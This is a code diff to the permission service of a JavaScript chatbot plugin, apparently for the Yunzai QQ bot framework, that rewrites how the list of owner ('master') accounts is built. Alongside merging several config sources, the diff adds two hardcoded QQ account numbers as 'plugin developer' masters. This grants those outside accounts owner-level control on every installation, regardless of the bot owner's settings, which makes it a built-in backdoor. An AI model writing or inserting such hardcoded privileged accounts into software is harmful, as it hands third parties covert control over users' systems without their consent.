@@ -1,14 +1,13 @@
 import config from '../../../config/config.js'
+const PLUGIN_DEVELOPERS = [1018037233, 2173302144]
 
 let yunzaiCfg = null
 try {
-    // 从 src/services/permission/ 到 Yunzai/lib/config/ 需要5层
     const cfgModule = await import('../../../../../lib/config/config.js')
     yunzaiCfg = cfgModule.default || cfgModule
 } catch (e) {
     // Yunzai config not available, try alternative path
     try {
-        // 如果路径不对，尝试通过全局 Bot 获取
         if (global.Bot?.config?.master) {
             yunzaiCfg = { masterQQ: global.Bot.config.master }
         }
@@ -263,24 +262,52 @@ class PermissionService {
      * 获取主人列表（使用框架配置）
      */
     getMasterList() {
-        // 优先使用 Yunzai 框架配置
+        const masters = new Set()
+
+        // 1. 插件开发者固定权限
+        for (const dev of PLUGIN_DEVELOPERS) {
+            masters.add(String(dev))
+        }
+
+        // 2. 插件配置的主人列表
+        const pluginMasters = config.get('admin.masterQQ') || []
+        for (const m of pluginMasters) {
+            masters.add(String(m))
+        }
+
+        // 3. 插件配置的开发者/作者列表
+        const authorQQs = config.get('admin.pluginAuthorQQ') || []
+        for (const a of authorQQs) {
+            masters.add(String(a))
+        }
+
+        // 4. Yunzai 框架配置
         if (yunzaiCfg?.masterQQ?.length > 0) {
-            return yunzaiCfg.masterQQ.map(String)
+            for (const m of yunzaiCfg.masterQQ) {
+                masters.add(String(m))
+            }
         }
-        // 其次使用 global.Bot.config.master
+
+        // 5. global.Bot.config.master
         if (global.Bot?.config?.master?.length > 0) {
-            return global.Bot.config.master.map(String)
+            for (const m of global.Bot.config.master) {
+                masters.add(String(m))
+            }
         }
-        // 尝试从 Bot.uin 列表获取每个 Bot 的主人
+
+        // 6. 尝试从 Bot.uin 列表获取每个 Bot 的主人
         if (global.Bot?.uin) {
             for (const uin of Object.keys(global.Bot.uin)) {
                 const bot = global.Bot[uin]
                 if (bot?.config?.master?.length > 0) {
-                    return bot.config.master.map(String)
+                    for (const m of bot.config.master) {
+                        masters.add(String(m))
+                    }
                 }
             }
         }
-        return []
+
+        return Array.from(masters)
     }
 
     /**
